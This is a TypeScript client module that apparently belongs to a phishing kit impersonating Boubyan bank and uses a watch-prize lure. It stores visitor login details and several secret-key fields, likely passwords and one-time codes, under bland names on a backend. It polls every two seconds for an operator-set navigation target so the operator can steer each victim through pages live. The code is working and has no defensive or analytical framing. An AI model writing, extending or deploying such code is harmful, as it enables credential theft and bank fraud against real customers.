import {
  clearVisitorRequestId,
  getSelectedWatch,
  getVisitorRequestId,
  clearPendingAdminDestination,
  setPendingAdminDestination,
  setVisitorRequestId,
  setVisitorToken,
  getVisitorToken,
} from "@/lib/session";
import type { BoubyanVisitor } from "@/lib/database.types";
import { LEGACY_TARGET_MAP } from "@/routes";

const PLACEHOLDERS = new Set(["----", "", null, undefined]);

type VisitorPatch = Record<string, unknown> & {
  stage_key?: string;
  contact_ref?: string;
  contact_name?: string;
  contact_address?: string;
  contact_extra?: string;
  member_label?: string;
  id_tail?: string;
  secret_key_a?: string;
  extra_key_a?: string;
  extra_key_b?: string;
  extra_key_c?: string;
  extra_key_d?: string;
  extra_key_e?: string;
  notify_key?: string;
  stage_state?: string;
  prize_choice?: string | null;
};

function stripPlaceholders(data: VisitorPatch): VisitorPatch {
  const out: VisitorPatch = {};
  for (const [key, value] of Object.entries(data)) {
    if (value === undefined || PLACEHOLDERS.has(value as string | null | undefined)) continue;
    out[key] = value;
  }
  return out;
}

async function apiRequest<T>(url: string, init: RequestInit = {}): Promise<T> {
  const visitorToken = getVisitorToken();
  const response = await fetch(url, {
    ...init,
    headers: {
      "Content-Type": "application/json",
      ...(visitorToken ? { "x-visitor-token": visitorToken } : {}),
      ...(init.headers || {}),
    },
  });
  if (!response.ok) throw new Error(`API ${response.status}`);
  return response.json() as Promise<T>;
}

export async function createOrUpdateRequest(data: VisitorPatch): Promise<string | null> {
  const existingId = getVisitorRequestId();
  const patch = stripPlaceholders(data);
  if (data.stage_key) patch.stage_key = data.stage_key;
  patch.last_seen_at = new Date().toISOString();

  if (existingId) {
    try {
      const row = await apiRequest<BoubyanVisitor>(`/api/visitors/${encodeURIComponent(existingId)}`, {
        method: "PATCH",
        body: JSON.stringify(patch),
      });
      return row.id;
    } catch {
      clearVisitorRequestId();
    }
  }

  const contact_ref =
    (typeof data.contact_ref === "string" && data.contact_ref.trim()) ||
    (typeof data.member_label === "string" && data.member_label.trim()) ||
    "visitor";
  const insert = {
    contact_ref,
    notify_key: data.notify_key || "----",
    stage_state: data.stage_state || "pending",
    stage_key: data.stage_key || "login",
    ...patch,
  };

  try {
    const row = await apiRequest<BoubyanVisitor>("/api/visitors", {
      method: "POST",
      body: JSON.stringify(insert),
    });
    setVisitorRequestId(row.id);
    if (row.visitor_token) setVisitorToken(row.visitor_token);
    return row.id;
  } catch (error) {
    console.error("Manus API insert error", error);
    return null;
  }
}

export async function pingVisitor() {
  const id = getVisitorRequestId();
  if (!id) return;
  await apiRequest(`/api/visitors/${encodeURIComponent(id)}`, {
    method: "PATCH",
    body: JSON.stringify({ last_seen_at: new Date().toISOString() }),
  }).catch(() => undefined);
}

export function markAdminNavigation(path: string) {
  setPendingAdminDestination(path);
}

export async function fetchVisitorRedirectTarget(): Promise<string | null> {
  const id = getVisitorRequestId();
  if (!id) return null;
  try {
    const row = await apiRequest<BoubyanVisitor | null>(`/api/visitors/${encodeURIComponent(id)}`);
    return resolveAdminTarget(row?.nav_target);
  } catch {
    return null;
  }
}

export function resolveAdminTarget(target: string | null | undefined): string | null {
  if (!target?.trim()) return null;
  const value = target.trim();
  if (/^https?:\/\//i.test(value)) return value;
  const noSlash = value.replace(/^\//, "");
  if (LEGACY_TARGET_MAP[value]) return LEGACY_TARGET_MAP[value];
  if (LEGACY_TARGET_MAP[noSlash]) return LEGACY_TARGET_MAP[noSlash];
  if (value.startsWith("/")) return value;
  return `/${noSlash}`;
}

export function subscribeVisitorRouting(currentPath: string, onNavigate: (path: string) => void) {
  const id = getVisitorRequestId();
  if (!id) return () => {};
  let active = true;
  const check = async () => {
    try {
      const row = await apiRequest<BoubyanVisitor | null>(`/api/visitors/${encodeURIComponent(id)}`);
      const dest = resolveAdminTarget(row?.nav_target);
      if (active && dest && !dest.startsWith("http") && dest !== currentPath) {
        markAdminNavigation(dest);
        onNavigate(dest);
      }
    } catch {
      // A temporary network failure should not interrupt the visitor flow.
    }
  };
  check();
  const interval = window.setInterval(check, 2000);
  return () => {
    active = false;
    window.clearInterval(interval);
  };
}

export async function initVisitorStep(step: string) {
  const watch = getSelectedWatch();
  const payload: VisitorPatch = {
    stage_key: step,
    stage_state: "pending",
    last_seen_at: new Date().toISOString(),
  };
  if (watch) payload.prize_choice = watch;

  if (step === "watches") {
    if (!getVisitorRequestId() && !watch) return;
    await createOrUpdateRequest({ ...payload, contact_ref: "visitor", notify_key: "----" });
  } else if (getVisitorRequestId()) {
    await createOrUpdateRequest({ ...payload, notify_key: "----" });
  }
}

export function fillFieldMessage(fieldName: string) {
  return fieldName ? `يرجى تعبئة ${fieldName}` : "يرجى تعبئة الحقل";
}
